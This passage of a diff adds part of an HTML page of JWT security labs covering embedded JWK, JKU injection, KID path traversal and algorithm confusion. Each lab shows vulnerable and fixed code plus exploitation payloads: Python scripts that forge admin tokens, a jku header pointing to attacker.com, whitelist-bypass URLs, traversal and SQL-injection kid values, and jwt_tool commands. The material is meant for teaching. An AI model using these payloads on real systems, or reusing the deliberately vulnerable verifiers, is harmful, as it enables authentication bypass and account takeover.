+<span class="secure-line">        // NEVER trust keys from the token itself</span>
+<span class="secure-line">        const decoded = jwt.verify(token, TRUSTED_PUBLIC_KEY, {</span>
+<span class="secure-line">            algorithms: ['RS256'],  // Explicit algorithm</span>
+<span class="secure-line">            complete: true</span>
+<span class="secure-line">        });</span>
+
+<span class="secure-line">        // Reject tokens with embedded JWK</span>
+<span class="secure-line">        if (decoded.header.jwk || decoded.header.jku) {</span>
+<span class="secure-line">            throw new Error('Embedded key parameters not allowed');</span>
+<span class="secure-line">        }</span>
+
+        return decoded.payload;
+    } catch (err) {
+        console.error('Token verification failed:', err.message);
+        return null;
+    }
+}</code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="payload-section">
+                    <h3><i class="fas fa-terminal"></i> Exploitation Payloads</h3>
+                    <div class="payload-box">
+                        <span class="payload-label">Generate RSA Keypair</span>
+# Generate RSA private key
+openssl genrsa -out attacker-private.pem 2048
+
+# Extract public key
+openssl rsa -in attacker-private.pem -pubout -out attacker-public.pem
+                    </div>
+                    <div class="payload-box">
+                        <span class="payload-label">Forged JWT Header with Embedded JWK</span>
+{
+  "alg": "RS256",
+  "typ": "JWT",
+  "jwk": {
+    "kty": "RSA",
+    "n": "0vx7agoebGcQSuuPiLJXZpt...",
+    "e": "AQAB",
+    "kid": "attacker-key-1"
+  }
+}
+                    </div>
+                    <div class="payload-box">
+                        <span class="payload-label">Python Exploit with PyJWT</span>
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import rsa
+import jwt
+import json
+
+# Generate attacker's RSA keypair
+private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+public_key = private_key.public_key()
+
+# Get public key numbers for JWK
+pub_numbers = public_key.public_numbers()
+n = pub_numbers.n.to_bytes((pub_numbers.n.bit_length() + 7) // 8, 'big')
+e = pub_numbers.e.to_bytes((pub_numbers.e.bit_length() + 7) // 8, 'big')
+
+import base64
+jwk = {
+    "kty": "RSA",
+    "n": base64.urlsafe_b64encode(n).rstrip(b'=').decode(),
+    "e": base64.urlsafe_b64encode(e).rstrip(b'=').decode()
+}
+
+# Create forged token with embedded JWK
+headers = {"alg": "RS256", "typ": "JWT", "jwk": jwk}
+payload = {"sub": "administrator", "role": "admin"}
+
+# Sign with attacker's private key
+pem = private_key.private_bytes(
+    encoding=serialization.Encoding.PEM,
+    format=serialization.PrivateFormat.PKCS8,
+    encryption_algorithm=serialization.NoEncryption()
+)
+token = jwt.encode(payload, pem, algorithm="RS256", headers=headers)
+print(token)
+                    </div>
+                </div>
+            </div>
+
+            <!-- Lab 5: JKU Header Injection -->
+            <div id="lab5-jku-injection" class="lab-content hidden">
+                <div class="lab-header">
+                    <h2>Lab 5: JWT Authentication Bypass via JKU Header Injection</h2>
+                    <div class="lab-meta">
+                        <span class="meta-item"><i class="fas fa-signal"></i> Practitioner</span>
+                        <span class="meta-item"><i class="fas fa-clock"></i> 20 minutes</span>
+                        <span class="meta-item"><i class="fas fa-tag"></i> JWT, JKU, SSRF</span>
+                    </div>
+                    <p class="lab-description">
+                        The server fetches the verification key from a URL specified in the "jku" (JWK Set URL)
+                        header parameter. Attackers can point this to their own server hosting malicious keys.
+                    </p>
+                </div>
+
+                <div class="info-box">
+                    <i class="fas fa-info-circle"></i>
+                    <strong>JKU Parameter:</strong> The "jku" header specifies a URL where the server should fetch the
+                    JSON Web Key Set (JWKS). Servers must validate this URL against a whitelist of trusted sources.
+                </div>
+
+                <div class="vuln-section">
+                    <h3><i class="fas fa-bug"></i> Vulnerability Explanation</h3>
+                    <ul class="vuln-list">
+                        <li>Server trusts the "jku" URL without proper validation</li>
+                        <li>Attacker hosts their own JWKS file with their public key</li>
+                        <li>Attacker crafts token with jku pointing to malicious server</li>
+                        <li>Server fetches attacker's key and validates the forged signature</li>
+                    </ul>
+                </div>
+
+                <div class="code-review-section">
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab5">
+                            <i class="fas fa-bug"></i> Vulnerable Code
+                        </button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab5">
+                            <i class="fas fa-shield-alt"></i> Secure Code
+                        </button>
+                    </div>
+
+                    <div class="code-container" id="lab5-vulnerable">
+                        <div class="code-header">
+                            <span class="code-filename"><i class="fab fa-python"></i> jwt_verifier.py</span>
+                        </div>
+                        <div class="code-block">
+                            <pre><code class="language-python">import jwt
+import requests
+from jwt.algorithms import RSAAlgorithm
+
+def verify_token(token):
+    # Decode header to get JKU URL
+    unverified = jwt.decode(token, options={"verify_signature": False})
+    header = jwt.get_unverified_header(token)
+
+<span class="vuln-line">    # VULNERABLE: Fetch keys from attacker-controlled URL</span>
+<span class="vuln-line">    jku_url = header.get('jku')</span>
+<span class="vuln-line">    if jku_url:</span>
+<span class="vuln-line">        # No URL validation - can be any server!</span>
+<span class="vuln-line">        response = requests.get(jku_url)</span>
+<span class="vuln-line">        jwks = response.json()</span>
+<span class="vuln-line">        </span>
+<span class="vuln-line">        # Find key by kid</span>
+<span class="vuln-line">        kid = header.get('kid')</span>
+<span class="vuln-line">        for key in jwks['keys']:</span>
+<span class="vuln-line">            if key.get('kid') == kid:</span>
+<span class="vuln-line">                public_key = RSAAlgorithm.from_jwk(key)</span>
+<span class="vuln-line">                return jwt.decode(token, public_key, algorithms=['RS256'])</span>
+
+    raise ValueError("Could not verify token")</code></pre>
+                        </div>
+                    </div>
+
+                    <div class="code-container hidden" id="lab5-secure">
+                        <div class="code-header">
+                            <span class="code-filename"><i class="fab fa-python"></i> jwt_verifier.py</span>
+                        </div>
+                        <div class="code-block">
+                            <pre><code class="language-python">import jwt
+import requests
+from jwt.algorithms import RSAAlgorithm
+from urllib.parse import urlparse
+
+<span class="secure-line"># SECURE: Whitelist of trusted JKU URLs</span>
+<span class="secure-line">TRUSTED_JKU_URLS = [</span>
+<span class="secure-line">    'https://auth.example.com/.well-known/jwks.json',</span>
+<span class="secure-line">    'https://login.example.com/keys'</span>
+<span class="secure-line">]</span>
+
+def verify_token(token):
+    header = jwt.get_unverified_header(token)
+    jku_url = header.get('jku')
+
+<span class="secure-line">    # SECURE: Validate JKU against whitelist</span>
+<span class="secure-line">    if jku_url not in TRUSTED_JKU_URLS:</span>
+<span class="secure-line">        raise ValueError(f"Untrusted JKU URL: {jku_url}")</span>
+
+<span class="secure-line">    # Additional URL validation</span>
+<span class="secure-line">    parsed = urlparse(jku_url)</span>
+<span class="secure-line">    if parsed.scheme != 'https':</span>
+<span class="secure-line">        raise ValueError("JKU must use HTTPS")</span>
+
+    # Fetch from trusted URL only
+    response = requests.get(jku_url, timeout=5)
+    response.raise_for_status()
+    jwks = response.json()
+
+    # Find and verify with trusted key
+    kid = header.get('kid')
+    for key in jwks.get('keys', []):
+        if key.get('kid') == kid:
+            public_key = RSAAlgorithm.from_jwk(key)
+            return jwt.decode(token, public_key, algorithms=['RS256'])
+
+    raise ValueError("Key not found in trusted JWKS")</code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="payload-section">
+                    <h3><i class="fas fa-terminal"></i> Exploitation Payloads</h3>
+                    <div class="payload-box">
+                        <span class="payload-label">Malicious JWKS File (host on attacker server)</span>
+{
+  "keys": [
+    {
+      "kty": "RSA",
+      "kid": "attacker-key-1",
+      "use": "sig",
+      "n": "0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2aiAFbWhM78LhWx4...",
+      "e": "AQAB"
+    }
+  ]
+}
+                    </div>
+                    <div class="payload-box">
+                        <span class="payload-label">Forged JWT Header</span>
+{
+  "alg": "RS256",
+  "typ": "JWT",
+  "kid": "attacker-key-1",
+  "jku": "https://attacker.com/.well-known/jwks.json"
+}
+                    </div>
+                    <div class="payload-box">
+                        <span class="payload-label">JKU URL Bypass Techniques</span>
+# If whitelist checks for domain prefix:
+https://trusted.com@attacker.com/jwks.json
+https://trusted.com.attacker.com/jwks.json
+https://attacker.com/jwks.json?trusted.com
+https://attacker.com#trusted.com/jwks.json
+
+# Open redirect on trusted domain:
+https://trusted.com/redirect?url=https://attacker.com/jwks.json
+
+# Path traversal if checking path:
+https://trusted.com/../../../attacker-controlled/jwks.json
+                    </div>
+                </div>
+            </div>
+
+            <!-- Lab 6: KID Header Path Traversal -->
+            <div id="lab6-kid-path-traversal" class="lab-content hidden">
+                <div class="lab-header">
+                    <h2>Lab 6: JWT Authentication Bypass via KID Header Path Traversal</h2>
+                    <div class="lab-meta">
+                        <span class="meta-item"><i class="fas fa-signal"></i> Practitioner</span>
+                        <span class="meta-item"><i class="fas fa-clock"></i> 20 minutes</span>
+                        <span class="meta-item"><i class="fas fa-tag"></i> JWT, KID, Path Traversal</span>
+                    </div>
+                    <p class="lab-description">
+                        The server uses the "kid" (Key ID) parameter to look up verification keys from the filesystem.
+                        Attackers can inject path traversal sequences to point to files with predictable content.
+                    </p>
+                </div>
+
+                <div class="info-box">
+                    <i class="fas fa-info-circle"></i>
+                    <strong>KID Parameter:</strong> The "kid" header identifies which key to use for verification.
+                    If used in file paths without sanitization, attackers can traverse to arbitrary files like /dev/null.
+                </div>
+
+                <div class="vuln-section">
+                    <h3><i class="fas fa-bug"></i> Vulnerability Explanation</h3>
+                    <ul class="vuln-list">
+                        <li>Server constructs file path using kid parameter directly</li>
+                        <li>Attacker uses "../" sequences to escape key directory</li>
+                        <li>Pointing to /dev/null allows signing with empty string key</li>
+                        <li>SQL injection also possible if kid used in database queries</li>
+                    </ul>
+                </div>
+
+                <div class="code-review-section">
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab6">
+                            <i class="fas fa-bug"></i> Vulnerable Code
+                        </button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab6">
+                            <i class="fas fa-shield-alt"></i> Secure Code
+                        </button>
+                    </div>
+
+                    <div class="code-container" id="lab6-vulnerable">
+                        <div class="code-header">
+                            <span class="code-filename"><i class="fab fa-node-js"></i> keyLoader.js</span>
+                        </div>
+                        <div class="code-block">
+                            <pre><code class="language-javascript">const jwt = require('jsonwebtoken');
+const fs = require('fs');
+const path = require('path');
+
+const KEYS_DIR = './keys';
+
+function getKeyById(kid) {
+<span class="vuln-line">    // VULNERABLE: Direct path concatenation with user input!</span>
+<span class="vuln-line">    const keyPath = path.join(KEYS_DIR, kid);</span>
+<span class="vuln-line">    return fs.readFileSync(keyPath, 'utf8');</span>
+}
+
+function verifyToken(token) {
+    const header = jwt.decode(token, { complete: true }).header;
+    const kid = header.kid;
+
+<span class="vuln-line">    // Attacker can use: ../../../dev/null</span>
+<span class="vuln-line">    const secret = getKeyById(kid);</span>
+
+    return jwt.verify(token, secret, { algorithms: ['HS256'] });
+}</code></pre>
+                        </div>
+                    </div>
+
+                    <div class="code-container hidden" id="lab6-secure">
+                        <div class="code-header">
+                            <span class="code-filename"><i class="fab fa-node-js"></i> keyLoader.js</span>
+                        </div>
+                        <div class="code-block">
+                            <pre><code class="language-javascript">const jwt = require('jsonwebtoken');
+const fs = require('fs');
+const path = require('path');
+
+const KEYS_DIR = './keys';
+
+<span class="secure-line">// SECURE: Whitelist of valid key IDs</span>
+<span class="secure-line">const VALID_KIDS = new Set(['key-1', 'key-2', 'key-3']);</span>
+
+function getKeyById(kid) {
+<span class="secure-line">    // Validate against whitelist</span>
+<span class="secure-line">    if (!VALID_KIDS.has(kid)) {</span>
+<span class="secure-line">        throw new Error(`Invalid key ID: ${kid}`);</span>
+<span class="secure-line">    }</span>
+
+<span class="secure-line">    // Sanitize: remove any path characters</span>
+<span class="secure-line">    const sanitized = kid.replace(/[^a-zA-Z0-9-_]/g, '');</span>
+<span class="secure-line">    </span>
+<span class="secure-line">    const keyPath = path.join(KEYS_DIR, sanitized + '.pem');</span>
+<span class="secure-line">    const resolved = path.resolve(keyPath);</span>
+<span class="secure-line">    </span>
+<span class="secure-line">    // Verify path is within KEYS_DIR</span>
+<span class="secure-line">    if (!resolved.startsWith(path.resolve(KEYS_DIR))) {</span>
+<span class="secure-line">        throw new Error('Path traversal detected');</span>
+<span class="secure-line">    }</span>
+
+    return fs.readFileSync(resolved, 'utf8');
+}
+
+function verifyToken(token) {
+    const header = jwt.decode(token, { complete: true }).header;
+    const secret = getKeyById(header.kid);
+    return jwt.verify(token, secret, { algorithms: ['HS256'] });
+}</code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="payload-section">
+                    <h3><i class="fas fa-terminal"></i> Exploitation Payloads</h3>
+                    <div class="payload-box">
+                        <span class="payload-label">Path Traversal to /dev/null (empty key)</span>
+{
+  "alg": "HS256",
+  "typ": "JWT",
+  "kid": "../../../dev/null"
+}
+                    </div>
+                    <div class="payload-box">
+                        <span class="payload-label">Sign with Empty String</span>
+import jwt
+
+# /dev/null returns empty string
+# Sign token with empty key
+token = jwt.encode(
+    {"sub": "administrator", "role": "admin"},
+    "",  # Empty string key
+    algorithm="HS256",
+    headers={"kid": "../../../dev/null"}
+)
+print(token)
+                    </div>
+                    <div class="payload-box">
+                        <span class="payload-label">Alternative Targets</span>
+# Empty/null files
+../../../dev/null
+../../../proc/self/environ  (if empty)
+
+# Predictable content files
+../../../etc/hostname
+../../../proc/sys/kernel/randomize_va_space  (returns "2")
+
+# SQL Injection in kid (if DB lookup)
+key-1' UNION SELECT 'attacker-secret' --
+                    </div>
+                    <div class="payload-box">
+                        <span class="payload-label">JWT Tool Command</span>
+# Using jwt_tool for kid injection
+python3 jwt_tool.py [token] -I -hc kid -hv "../../../dev/null" -S hs256 -p ""
+                    </div>
+                </div>
+            </div>
+
+            <!-- Lab 7: Algorithm Confusion -->
+            <div id="lab7-algorithm-confusion" class="lab-content hidden">
+                <div class="lab-header">
+                    <h2>Lab 7: JWT Authentication Bypass via Algorithm Confusion</h2>
+                    <div class="lab-meta">
+                        <span class="meta-item"><i class="fas fa-signal"></i> Expert</span>
+                        <span class="meta-item"><i class="fas fa-clock"></i> 30 minutes</span>
+                        <span class="meta-item"><i class="fas fa-tag"></i> JWT, RS256, HS256</span>
+                    </div>
+                    <p class="lab-description">
+                        The server uses RSA (RS256) for signing but doesn't restrict algorithms during verification.
+                        Attackers can change to HS256 and sign with the public key, which the server then uses to verify.
+                    </p>
+                </div>
+
+                <div class="info-box">
+                    <i class="fas fa-info-circle"></i>
+                    <strong>Algorithm Confusion:</strong> RS256 uses asymmetric keys (public/private), while HS256 uses symmetric keys.
+                    If an attacker switches to HS256 and uses the public key as the secret, the server may verify it as valid.
+                </div>
+
+                <div class="vuln-section">
+                    <h3><i class="fas fa-bug"></i> Vulnerability Explanation</h3>
+                    <ul class="vuln-list">
+                        <li>Server configured for RS256 but accepts any algorithm in token header</li>
+                        <li>Attacker obtains the server's public key (often exposed at /jwks.json)</li>
+                        <li>Attacker changes algorithm to HS256 and signs with the public key</li>
+                        <li>Server uses same public key for HMAC verification - signature matches!</li>
+                    </ul>
+                </div>
+
+                <div class="code-review-section">
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab7">
+                            <i class="fas fa-bug"></i> Vulnerable Code
+                        </button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab7">
+                            <i class="fas fa-shield-alt"></i> Secure Code
+                        </button>
+                    </div>
+
+                    <div class="code-container" id="lab7-vulnerable">
+                        <div class="code-header">
+                            <span class="code-filename"><i class="fab fa-python"></i> auth.py</span>
+                        </div>
+                        <div class="code-block">
+                            <pre><code class="language-python">import jwt
+
+# Server's RSA public key (also used for HMAC!)
+PUBLIC_KEY = open('public.pem').read()
+
+def verify_token(token):
+<span class="vuln-line">    # VULNERABLE: No algorithm restriction</span>
+<span class="vuln-line">    # Server accepts whatever algorithm is in the header</span>
+<span class="vuln-line">    try:</span>
+<span class="vuln-line">        # If alg=HS256, this uses PUBLIC_KEY as HMAC secret!</span>
+<span class="vuln-line">        return jwt.decode(token, PUBLIC_KEY, algorithms=['RS256', 'HS256'])</span>
+<span class="vuln-line">    except jwt.InvalidTokenError:</span>
+<span class="vuln-line">        return None</span>
+
+# Even worse - some libraries auto-detect algorithm
+def verify_token_autodect(token):
+<span class="vuln-line">    # EXTREMELY VULNERABLE: Algorithm from token header</span>
+<span class="vuln-line">    header = jwt.get_unverified_header(token)</span>
+<span class="vuln-line">    return jwt.decode(token, PUBLIC_KEY, algorithms=[header['alg']])</span></code></pre>
+                        </div>
+                    </div>
+
+                    <div class="code-container hidden" id="lab7-secure">
+                        <div class="code-header">
+                            <span class="code-filename"><i class="fab fa-python"></i> auth.py</span>
+                        </div>
+                        <div class="code-block">
+                            <pre><code class="language-python">import jwt
+from cryptography.hazmat.primitives import serialization
+
+# Load keys properly
+PRIVATE_KEY = open('private.pem').read()
+PUBLIC_KEY = open('public.pem').read()
+
+def verify_token(token):
+    try:
+<span class="secure-line">        # SECURE: Explicitly allow ONLY RS256</span>
+<span class="secure-line">        # Never include HS256 when using RSA keys</span>
+<span class="secure-line">        return jwt.decode(</span>
+<span class="secure-line">            token,</span>
+<span class="secure-line">            PUBLIC_KEY,</span>
+<span class="secure-line">            algorithms=['RS256']  # Single algorithm only!</span>
+<span class="secure-line">        )</span>
+    except jwt.InvalidTokenError as e:
+        print(f"JWT verification failed: {e}")
+        return None
+
+def create_token(user_data):
+<span class="secure-line">    # SECURE: Sign with private key using RS256</span>
+<span class="secure-line">    return jwt.encode(</span>
+<span class="secure-line">        user_data,</span>
+<span class="secure-line">        PRIVATE_KEY,</span>
+<span class="secure-line">        algorithm='RS256'</span>
+<span class="secure-line">    )</span></code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="payload-section">
+                    <h3><i class="fas fa-terminal"></i> Exploitation Payloads</h3>
+                    <div class="payload-box">
+                        <span class="payload-label">Step 1: Obtain Server's Public Key</span>
+# Often exposed at standard endpoints
+curl https://target.com/.well-known/jwks.json
+curl https://target.com/jwks.json
+curl https://target.com/api/keys
+
+# Or extract from an existing valid token (X5C header)
+# Or from TLS certificate
+                    </div>
+                    <div class="payload-box">
+                        <span class="payload-label">Step 2: Convert JWK to PEM (if needed)</span>
+from cryptography.hazmat.primitives import serialization
+from jwt.algorithms import RSAAlgorithm
+import json
+
+jwk = {
+    "kty": "RSA",
+    "n": "...",
+    "e": "AQAB"
+}
+
+public_key = RSAAlgorithm.from_jwk(json.dumps(jwk))
+pem = public_key.public_bytes(
+    encoding=serialization.Encoding.PEM,
+    format=serialization.PublicFormat.SubjectPublicKeyInfo
+)
+print(pem.decode())
+                    </div>
+                    <div class="payload-box">
+                        <span class="payload-label">Step 3: Sign Token with Public Key as HMAC Secret</span>
+import jwt
+
+# Read the server's public key
+public_key = open('server-public.pem').read()
+
+# Create forged token using HS256 with public key as secret
+forged_token = jwt.encode(
+    {"sub": "administrator", "role": "admin"},
+    public_key,  # Use public key as HMAC secret!
+    algorithm="HS256"
+)
+print(forged_token)
+                    </div>
+                    <div class="payload-box">
+                        <span class="payload-label">JWT Tool Automated Attack</span>
+# Download public key
+wget https://target.com/jwks.json
+
+# Convert and attack
+python3 jwt_tool.py [token] -X k -pk public.pem
+
+# Or specify algorithm confusion directly
+python3 jwt_tool.py [token] -S hs256 -k public.pem
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-javascript.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-json.min.js"></script>
+    <script>
+        // Lab navigation
+        document.querySelectorAll('.lab-item').forEach(item => {
+            item.addEventListener('click', function() {
+                // Update active state
+                document.querySelectorAll('.lab-item').forEach(i => i.classList.remove('active'));
+                this.classList.add('active');
+
+                // Show corresponding content
+                const labId = this.dataset.lab;
+                document.querySelectorAll('.lab-content').forEach(content => {
+                    content.classList.add('hidden');
+                });
+                document.getElementById(labId).classList.remove('hidden');
+            });
+        });
+
+        // Code tab switching
+        document.querySelectorAll('.code-tab').forEach(tab => {
+            tab.addEventListener('click', function() {
+                const lab = this.dataset.lab;
+                const view = this.dataset.view;
+
+                // Update tab states
+                document.querySelectorAll(`.code-tab[data-lab="${lab}"]`).forEach(t => {
+                    t.classList.remove('active');
+                });
+                this.classList.add('active');
+
+                // Show corresponding code
+                document.getElementById(`${lab}-vulnerable`).classList.toggle('hidden', view !== 'vulnerable');
+                document.getElementById(`${lab}-secure`).classList.toggle('hidden', view !== 'secure');
+            });
+        });
+    </script>
+</body>
+</html>
